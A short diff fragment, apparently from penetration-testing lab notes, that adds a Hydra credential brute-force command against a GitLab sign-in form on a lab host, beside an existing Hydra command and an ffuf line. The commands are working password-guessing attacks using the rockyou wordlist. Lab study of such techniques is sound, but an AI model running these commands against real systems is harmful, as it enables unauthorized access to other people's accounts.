@@ -48,3 +48,7 @@ ffuf -u http://10.129.201.88/users/sign_in \
 
 hydra -l admin -P passwords.txt <TARGET_IP> http-post-form \
 "/users/sign_in:user[login]=^USER^&user[password]=^PASS^:Invalid Login or password"
+
+
+hydra -L username.txt -P /usr/share/wordlists/rockyou.txt gitlab.inlanefreight.local -s 8081 http-post-form \
+"/users/sign_in:user[login]=^USER^&user[password]=^PASS^:Invalid Login or password" -V
